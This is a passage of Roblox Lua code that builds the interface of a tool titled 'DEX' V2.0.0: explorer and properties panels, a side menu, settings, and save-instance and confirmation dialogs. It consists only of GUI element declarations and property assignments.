local NewGuiPart117 = Instance.new("TextLabel")
local NewGuiPart118 = Instance.new("TextButton")
local NewGuiPart119 = Instance.new("TextLabel")
local NewGuiPart120 = Instance.new("TextLabel")
local NewGuiPart121 = Instance.new("Frame")
local NewGuiPart122 = Instance.new("TextLabel")
local NewGuiPart123 = Instance.new("TextLabel")
local NewGuiPart124 = Instance.new("TextButton")
local NewGuiPart125 = Instance.new("TextLabel")
local NewGuiPart126 = Instance.new("TextLabel")
local NewGuiPart127 = Instance.new("Frame")
local NewGuiPart128 = Instance.new("TextLabel")
local NewGuiPart129 = Instance.new("TextLabel")
local NewGuiPart130 = Instance.new("TextButton")
local NewGuiPart131 = Instance.new("TextLabel")
local NewGuiPart132 = Instance.new("TextLabel")
local NewGuiPart133 = Instance.new("Frame")
local NewGuiPart134 = Instance.new("TextLabel")
local NewGuiPart135 = Instance.new("TextLabel")
local NewGuiPart136 = Instance.new("TextButton")
local NewGuiPart137 = Instance.new("TextLabel")
local NewGuiPart138 = Instance.new("TextLabel")
local NewGuiPart139 = Instance.new("TextLabel")
local NewGuiPart140 = Instance.new("Frame")
local NewGuiPart141 = Instance.new("Frame")
local NewGuiPart142 = Instance.new("TextLabel")
local NewGuiPart143 = Instance.new("TextButton")
local NewGuiPart144 = Instance.new("TextBox")
local NewGuiPart145 = Instance.new("Frame")
local NewGuiPart146 = Instance.new("TextButton")
local NewGuiPart147 = Instance.new("TextLabel")
local NewGuiPart148 = Instance.new("TextLabel")
local NewGuiPart149 = Instance.new("Frame")
local NewGuiPart150 = Instance.new("Frame")
local NewGuiPart151 = Instance.new("TextLabel")
local NewGuiPart152 = Instance.new("TextLabel")
local NewGuiPart153 = Instance.new("BindableFunction")
local NewGuiPart154 = Instance.new("BindableFunction")
local NewGuiPart155 = Instance.new("BindableFunction")
local NewGuiPart156 = Instance.new("BindableFunction")
local NewGuiPart157 = Instance.new("BindableEvent")
local NewGuiPart158 = Instance.new("BindableFunction")
local NewGuiPart159 = Instance.new("BindableFunction")
local NewGuiPart160 = Instance.new("BindableEvent")
local NewGuiPart161 = Instance.new("BindableFunction")
local NewGuiPart162 = Instance.new("BindableFunction")
local NewGuiPart163 = Instance.new("BindableEvent")
-- Properties

NewGuiPart1.Name = "Dex"

NewGuiPart2.Name = "PropertiesFrame"
NewGuiPart2.Parent = NewGuiPart1
NewGuiPart2.Active = true
NewGuiPart2.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart2.BackgroundTransparency = 0.10000000149012
NewGuiPart2.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart2.Position = UDim2.new(1, 0, 0.5, 36)
NewGuiPart2.Size = UDim2.new(0, 300, 0.5, -36)

NewGuiPart158.Name = "GetApi"
NewGuiPart158.Parent = NewGuiPart2
NewGuiPart158.Archivable = true

NewGuiPart159.Name = "GetAwaiting"
NewGuiPart159.Parent = NewGuiPart2
NewGuiPart159.Archivable = true

NewGuiPart160.Name = "SetAwaiting"
NewGuiPart160.Parent = NewGuiPart2
NewGuiPart160.Archivable = true

NewGuiPart3.Name = "Header"
NewGuiPart3.Parent = NewGuiPart2
NewGuiPart3.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart3.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart3.Position = UDim2.new(0, 0, 0, -36)
NewGuiPart3.Size = UDim2.new(1, 0, 0, 35)

NewGuiPart4.Parent = NewGuiPart3
NewGuiPart4.BackgroundTransparency = 1
NewGuiPart4.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart4.Size = UDim2.new(1, -4, 0.5, 0)
NewGuiPart4.Font = Enum.Font.SourceSans
NewGuiPart4.FontSize = Enum.FontSize.Size14
NewGuiPart4.Text = "Properties"
NewGuiPart4.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart4.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart5.Parent = NewGuiPart3
NewGuiPart5.BackgroundTransparency = 0.80000001192093
NewGuiPart5.Position = UDim2.new(0, 4, 0.5, 0)
NewGuiPart5.Size = UDim2.new(1, -8, 0.5, -3)
NewGuiPart5.Font = Enum.Font.SourceSans
NewGuiPart5.FontSize = Enum.FontSize.Size14
NewGuiPart5.Text = "Search Properties"
--NewGuiPart5.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart5.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart6.Name = "ExplorerPanel"
NewGuiPart6.Parent = NewGuiPart1
NewGuiPart6.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart6.BackgroundTransparency = 0.10000000149012
NewGuiPart6.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart6.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart6.Size = UDim2.new(0, 300, 0.5, 0)

NewGuiPart153.Name = "GetOption"
NewGuiPart153.Parent = NewGuiPart6
NewGuiPart153.Archivable = true

NewGuiPart154.Name = "GetSelection"
NewGuiPart154.Parent = NewGuiPart6
NewGuiPart154.Archivable = true

NewGuiPart155.Name = "SetOption"
NewGuiPart155.Parent = NewGuiPart6
NewGuiPart155.Archivable = true

NewGuiPart156.Name = "SetSelection"
NewGuiPart156.Parent = NewGuiPart6
NewGuiPart156.Archivable = true

NewGuiPart157.Name = "SelectionChanged"
NewGuiPart157.Parent = NewGuiPart6
NewGuiPart157.Archivable = true

NewGuiPart7.Name = "SideMenu"
NewGuiPart7.Parent = NewGuiPart1
NewGuiPart7.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart7.BackgroundTransparency = 1
NewGuiPart7.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart7.BorderSizePixel = 0
NewGuiPart7.Position = UDim2.new(1, -330, 0, 0)
NewGuiPart7.Size = UDim2.new(0, 30, 0, 180)
NewGuiPart7.Visible = false
NewGuiPart7.ZIndex = 2

NewGuiPart8.Name = "Toggle"
NewGuiPart8.Parent = NewGuiPart7
NewGuiPart8.Active = false
NewGuiPart8.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart8.BorderSizePixel = 0
NewGuiPart8.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart8.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart8.AutoButtonColor = false
NewGuiPart8.Font = Enum.Font.SourceSans
NewGuiPart8.FontSize = Enum.FontSize.Size24
NewGuiPart8.Text = ">"
NewGuiPart8.TextTransparency = 1
NewGuiPart8.TextWrapped = true

NewGuiPart9.Name = "Title"
NewGuiPart9.Parent = NewGuiPart7
NewGuiPart9.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart9.BackgroundTransparency = 1
NewGuiPart9.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart9.ZIndex = 2
NewGuiPart9.Font = Enum.Font.SourceSansBold
NewGuiPart9.FontSize = Enum.FontSize.Size14
NewGuiPart9.Text = "DEX"
NewGuiPart9.TextWrapped = true

NewGuiPart10.Name = "Version"
NewGuiPart10.Parent = NewGuiPart7
NewGuiPart10.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart10.BackgroundTransparency = 1
NewGuiPart10.Position = UDim2.new(0, 0, 0, 15)
NewGuiPart10.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart10.ZIndex = 2
NewGuiPart10.Font = Enum.Font.SourceSansBold
NewGuiPart10.FontSize = Enum.FontSize.Size12
NewGuiPart10.Text = "V2.0.0"
NewGuiPart10.TextWrapped = true

NewGuiPart11.Name = "Slant"
NewGuiPart11.Parent = NewGuiPart7
NewGuiPart11.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart11.BackgroundTransparency = 1
NewGuiPart11.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart11.Rotation = 180
NewGuiPart11.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart11.Image = "rbxassetid://474172996"
NewGuiPart11.ImageColor3 = Color3.new(0.913726, 0.913726, 0.913726)

NewGuiPart12.Name = "Main"
NewGuiPart12.Parent = NewGuiPart7
NewGuiPart12.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart12.BorderSizePixel = 0
NewGuiPart12.Size = UDim2.new(0, 30, 0, 30)

NewGuiPart13.Name = "SlideOut"
NewGuiPart13.Parent = NewGuiPart7
NewGuiPart13.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart13.BackgroundTransparency = 1
NewGuiPart13.BorderSizePixel = 0
NewGuiPart13.ClipsDescendants = true
NewGuiPart13.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart13.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart14.Name = "SlideFrame"
NewGuiPart14.Parent = NewGuiPart13
NewGuiPart14.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart14.BorderSizePixel = 0
NewGuiPart14.Position = UDim2.new(0, 0, 0, -150)
NewGuiPart14.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart15.Name = "Explorer"
NewGuiPart15.Parent = NewGuiPart14
NewGuiPart15.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart15.BackgroundTransparency = 1
NewGuiPart15.BorderSizePixel = 0
NewGuiPart15.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart15.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart15.ZIndex = 2
NewGuiPart15.AutoButtonColor = false
NewGuiPart15.Font = Enum.Font.SourceSans
NewGuiPart15.FontSize = Enum.FontSize.Size24
NewGuiPart15.Text = ""

NewGuiPart16.Name = "Icon"
NewGuiPart16.Parent = NewGuiPart15
NewGuiPart16.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart16.BackgroundTransparency = 1
NewGuiPart16.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart16.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart16.ZIndex = 2
NewGuiPart16.Image = "rbxassetid://472635937"
NewGuiPart16.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart17.Name = "SaveMap"
NewGuiPart17.Parent = NewGuiPart14
NewGuiPart17.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart17.BackgroundTransparency = 1
NewGuiPart17.BorderSizePixel = 0
NewGuiPart17.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart17.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart17.ZIndex = 2
NewGuiPart17.AutoButtonColor = false
NewGuiPart17.Font = Enum.Font.SourceSans
NewGuiPart17.FontSize = Enum.FontSize.Size24
NewGuiPart17.Text = ""

NewGuiPart18.Name = "Icon"
NewGuiPart18.Parent = NewGuiPart17
NewGuiPart18.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart18.BackgroundTransparency = 1
NewGuiPart18.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart18.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart18.ZIndex = 2
NewGuiPart18.Image = "rbxassetid://472636337"
NewGuiPart18.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart19.Name = "Settings"
NewGuiPart19.Parent = NewGuiPart14
NewGuiPart19.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart19.BackgroundTransparency = 1
NewGuiPart19.BorderSizePixel = 0
NewGuiPart19.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart19.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart19.ZIndex = 2
NewGuiPart19.AutoButtonColor = false
NewGuiPart19.Font = Enum.Font.SourceSans
NewGuiPart19.FontSize = Enum.FontSize.Size24
NewGuiPart19.Text = ""

NewGuiPart20.Name = "Icon"
NewGuiPart20.Parent = NewGuiPart19
NewGuiPart20.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart20.BackgroundTransparency = 1
NewGuiPart20.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart20.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart20.ZIndex = 2
NewGuiPart20.Image = "rbxassetid://472635774"
NewGuiPart20.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart21.Name = "Remotes"
NewGuiPart21.Parent = NewGuiPart14
NewGuiPart21.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart21.BackgroundTransparency = 1
NewGuiPart21.BorderSizePixel = 0
NewGuiPart21.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart21.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart21.ZIndex = 2
NewGuiPart21.AutoButtonColor = false
NewGuiPart21.Font = Enum.Font.SourceSans
NewGuiPart21.FontSize = Enum.FontSize.Size24
NewGuiPart21.Text = ""

NewGuiPart22.Name = "Icon"
NewGuiPart22.Parent = NewGuiPart21
NewGuiPart22.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart22.BackgroundTransparency = 1
NewGuiPart22.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart22.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart22.ZIndex = 2
NewGuiPart22.Image = "rbxassetid://472636187"
NewGuiPart22.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart23.Name = "About"
NewGuiPart23.Parent = NewGuiPart14
NewGuiPart23.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart23.BackgroundTransparency = 1
NewGuiPart23.BorderSizePixel = 0
NewGuiPart23.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart23.ZIndex = 2
NewGuiPart23.AutoButtonColor = false
NewGuiPart23.Font = Enum.Font.SourceSans
NewGuiPart23.FontSize = Enum.FontSize.Size24
NewGuiPart23.Text = ""

NewGuiPart24.Name = "Icon"
NewGuiPart24.Parent = NewGuiPart23
NewGuiPart24.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart24.BackgroundTransparency = 1
NewGuiPart24.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart24.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart24.ZIndex = 2
NewGuiPart24.Image = "rbxassetid://476354004"
NewGuiPart24.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart25.Name = "OpenScriptEditor"
NewGuiPart25.Parent = NewGuiPart7
NewGuiPart25.Active = false
NewGuiPart25.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart25.BorderSizePixel = 0
NewGuiPart25.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart25.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart25.ZIndex = 2
NewGuiPart25.AutoButtonColor = false
NewGuiPart25.Font = Enum.Font.SourceSans
NewGuiPart25.FontSize = Enum.FontSize.Size24
NewGuiPart25.Text = ""

NewGuiPart26.Name = "Icon"
NewGuiPart26.Parent = NewGuiPart25
NewGuiPart26.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart26.BackgroundTransparency = 1
NewGuiPart26.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart26.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart26.ZIndex = 2
NewGuiPart26.Image = "rbxassetid://475456048"
NewGuiPart26.ImageColor3 = Color3.new(0.105882, 0.164706, 0.207843)
NewGuiPart26.ImageTransparency = 1

NewGuiPart27.Name = "Toggle"
NewGuiPart27.Parent = NewGuiPart1
NewGuiPart27.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart27.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart27.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart27.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart27.Font = Enum.Font.SourceSans
NewGuiPart27.FontSize = Enum.FontSize.Size24
NewGuiPart27.Text = "<"

NewGuiPart28.Name = "SettingsPanel"
NewGuiPart28.Parent = NewGuiPart1
NewGuiPart28.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart28.BackgroundTransparency = 0.10000000149012
NewGuiPart28.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart28.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart28.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart162.Name = "GetSetting"
NewGuiPart162.Parent = NewGuiPart28
NewGuiPart162.Archivable = true

NewGuiPart29.Name = "Header"
NewGuiPart29.Parent = NewGuiPart28
NewGuiPart29.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart29.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart29.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart30.Parent = NewGuiPart29
NewGuiPart30.BackgroundTransparency = 1
NewGuiPart30.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart30.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart30.Font = Enum.Font.SourceSans
NewGuiPart30.FontSize = Enum.FontSize.Size14
NewGuiPart30.Text = "Settings"
NewGuiPart30.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart30.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart31.Name = "SettingTemplate"
NewGuiPart31.Parent = NewGuiPart28
NewGuiPart31.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart31.BackgroundTransparency = 1
NewGuiPart31.Position = UDim2.new(0, 0, 0, 18)
NewGuiPart31.Size = UDim2.new(1, 0, 0, 60)
NewGuiPart31.Visible = false

NewGuiPart32.Name = "SName"
NewGuiPart32.Parent = NewGuiPart31
NewGuiPart32.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart32.BackgroundTransparency = 1
NewGuiPart32.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart32.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart32.Font = Enum.Font.SourceSans
NewGuiPart32.FontSize = Enum.FontSize.Size18
NewGuiPart32.Text = "SettingName"
NewGuiPart32.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart33.Name = "Status"
NewGuiPart33.Parent = NewGuiPart31
NewGuiPart33.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart33.BackgroundTransparency = 1
NewGuiPart33.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart33.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart33.Font = Enum.Font.SourceSans
NewGuiPart33.FontSize = Enum.FontSize.Size18
NewGuiPart33.Text = "Off"
NewGuiPart33.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart34.Name = "Change"
NewGuiPart34.Parent = NewGuiPart31
NewGuiPart34.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart34.BorderSizePixel = 0
NewGuiPart34.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart34.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart34.Font = Enum.Font.SourceSans
NewGuiPart34.FontSize = Enum.FontSize.Size14
NewGuiPart34.Text = ""

NewGuiPart35.Name = "OnBar"
NewGuiPart35.Parent = NewGuiPart34
NewGuiPart35.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart35.BorderSizePixel = 0
NewGuiPart35.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart35.Font = Enum.Font.SourceSans
NewGuiPart35.FontSize = Enum.FontSize.Size14
NewGuiPart35.Text = ""

NewGuiPart36.Name = "Bar"
NewGuiPart36.Parent = NewGuiPart34
NewGuiPart36.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart36.BorderSizePixel = 0
NewGuiPart36.ClipsDescendants = true
NewGuiPart36.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart36.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart36.Font = Enum.Font.SourceSans
NewGuiPart36.FontSize = Enum.FontSize.Size14
NewGuiPart36.Text = ""

NewGuiPart37.Name = "SettingList"
NewGuiPart37.Parent = NewGuiPart28
NewGuiPart37.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart37.BackgroundTransparency = 1
NewGuiPart37.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart37.Size = UDim2.new(1, 0, 1, -17)

NewGuiPart38.Name = "SaveInstance"
NewGuiPart38.Parent = NewGuiPart1
NewGuiPart38.Active = true
NewGuiPart38.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart38.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart38.Draggable = true
NewGuiPart38.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart38.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart38.Visible = false
NewGuiPart38.ZIndex = 2

NewGuiPart39.Name = "Title"
NewGuiPart39.Parent = NewGuiPart38
NewGuiPart39.BackgroundTransparency = 1
NewGuiPart39.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart39.ZIndex = 2
NewGuiPart39.Font = Enum.Font.SourceSans
NewGuiPart39.FontSize = Enum.FontSize.Size14
NewGuiPart39.Text = "Save Instance"
NewGuiPart39.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart39.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart40.Name = "MainWindow"
NewGuiPart40.Parent = NewGuiPart38
NewGuiPart40.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart40.BackgroundTransparency = 0.10000000149012
NewGuiPart40.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart40.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart41.Name = "Save"
NewGuiPart41.Parent = NewGuiPart40
NewGuiPart41.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart41.BackgroundTransparency = 0.5
NewGuiPart41.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart41.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart41.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart41.Font = Enum.Font.SourceSans
NewGuiPart41.FontSize = Enum.FontSize.Size18
NewGuiPart41.Text = "Save"

NewGuiPart42.Name = "Desc"
NewGuiPart42.Parent = NewGuiPart40
NewGuiPart42.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart42.BackgroundTransparency = 1
NewGuiPart42.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart42.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart42.Font = Enum.Font.SourceSans
NewGuiPart42.FontSize = Enum.FontSize.Size14
NewGuiPart42.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
NewGuiPart42.TextWrapped = true

NewGuiPart43.Name = "Cancel"
NewGuiPart43.Parent = NewGuiPart40
NewGuiPart43.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart43.BackgroundTransparency = 0.5
NewGuiPart43.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart43.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart43.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart43.Font = Enum.Font.SourceSans
NewGuiPart43.FontSize = Enum.FontSize.Size18
NewGuiPart43.Text = "Cancel"

NewGuiPart44.Name = "FileName"
NewGuiPart44.Parent = NewGuiPart40
NewGuiPart44.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart44.BackgroundTransparency = 0.20000000298023
NewGuiPart44.Position = UDim2.new(0.075000003, 0, 0.400000006, 0)
NewGuiPart44.Size = UDim2.new(0.850000024, 0, 0, 30)
NewGuiPart44.Font = Enum.Font.SourceSans
NewGuiPart44.FontSize = Enum.FontSize.Size18
NewGuiPart44.Text = ""
NewGuiPart44.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart45.Name = "SaveObjects"
NewGuiPart45.Parent = NewGuiPart40
NewGuiPart45.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart45.BackgroundTransparency = 0.60000002384186
NewGuiPart45.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart45.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart45.ZIndex = 2
NewGuiPart45.Font = Enum.Font.SourceSans
NewGuiPart45.FontSize = Enum.FontSize.Size18
NewGuiPart45.Text = ""
NewGuiPart45.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart46.Name = "enabled"
NewGuiPart46.Parent = NewGuiPart45
NewGuiPart46.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart46.BackgroundTransparency = 0.40000000596046
NewGuiPart46.BorderSizePixel = 0
NewGuiPart46.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart46.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart46.Font = Enum.Font.SourceSans
NewGuiPart46.FontSize = Enum.FontSize.Size14
NewGuiPart46.Text = ""

NewGuiPart47.Name = "Desc2"
NewGuiPart47.Parent = NewGuiPart40
NewGuiPart47.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart47.BackgroundTransparency = 1
NewGuiPart47.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart47.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart47.Font = Enum.Font.SourceSans
NewGuiPart47.FontSize = Enum.FontSize.Size14
NewGuiPart47.Text = "Save \"Object\" type values"
NewGuiPart47.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart48.Name = "Confirmation"
NewGuiPart48.Parent = NewGuiPart1
NewGuiPart48.Active = true
NewGuiPart48.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart48.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart48.Draggable = true
NewGuiPart48.Position = UDim2.new(0.300000012, 0, 0.349999994, 0)
NewGuiPart48.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart48.Visible = false
NewGuiPart48.ZIndex = 3

NewGuiPart49.Name = "Title"
NewGuiPart49.Parent = NewGuiPart48
NewGuiPart49.BackgroundTransparency = 1
NewGuiPart49.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart49.ZIndex = 3
NewGuiPart49.Font = Enum.Font.SourceSans
NewGuiPart49.FontSize = Enum.FontSize.Size14
NewGuiPart49.Text = "Confirm"
NewGuiPart49.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart49.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart50.Name = "MainWindow"
NewGuiPart50.Parent = NewGuiPart48
NewGuiPart50.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart50.BackgroundTransparency = 0.10000000149012
NewGuiPart50.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart50.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart50.ZIndex = 2

NewGuiPart51.Name = "Yes"
NewGuiPart51.Parent = NewGuiPart50
NewGuiPart51.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart51.BackgroundTransparency = 0.5
NewGuiPart51.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart51.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart51.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart51.ZIndex = 2
NewGuiPart51.Font = Enum.Font.SourceSans
NewGuiPart51.FontSize = Enum.FontSize.Size18
NewGuiPart51.Text = "Yes"

NewGuiPart52.Name = "Desc"
NewGuiPart52.Parent = NewGuiPart50
NewGuiPart52.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart52.BackgroundTransparency = 1
NewGuiPart52.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart52.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart52.ZIndex = 2
NewGuiPart52.Font = Enum.Font.SourceSans
NewGuiPart52.FontSize = Enum.FontSize.Size14
NewGuiPart52.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart52.TextWrapped = true

NewGuiPart53.Name = "No"
NewGuiPart53.Parent = NewGuiPart50
NewGuiPart53.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart53.BackgroundTransparency = 0.5
NewGuiPart53.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart53.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart53.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart53.ZIndex = 2
NewGuiPart53.Font = Enum.Font.SourceSans
NewGuiPart53.FontSize = Enum.FontSize.Size18
NewGuiPart53.Text = "No"

NewGuiPart54.Name = "Caution"
NewGuiPart54.Parent = NewGuiPart1
NewGuiPart54.Active = true
NewGuiPart54.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart54.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart54.Draggable = true
NewGuiPart54.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart54.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart54.Visible = false
NewGuiPart54.ZIndex = 5

NewGuiPart55.Name = "Title"
NewGuiPart55.Parent = NewGuiPart54
NewGuiPart55.BackgroundTransparency = 1
NewGuiPart55.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart55.ZIndex = 5
NewGuiPart55.Font = Enum.Font.SourceSans
NewGuiPart55.FontSize = Enum.FontSize.Size14
NewGuiPart55.Text = "Caution"
NewGuiPart55.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart55.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart56.Name = "MainWindow"
NewGuiPart56.Parent = NewGuiPart54
NewGuiPart56.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart56.BackgroundTransparency = 0.10000000149012
NewGuiPart56.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart56.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart56.ZIndex = 4

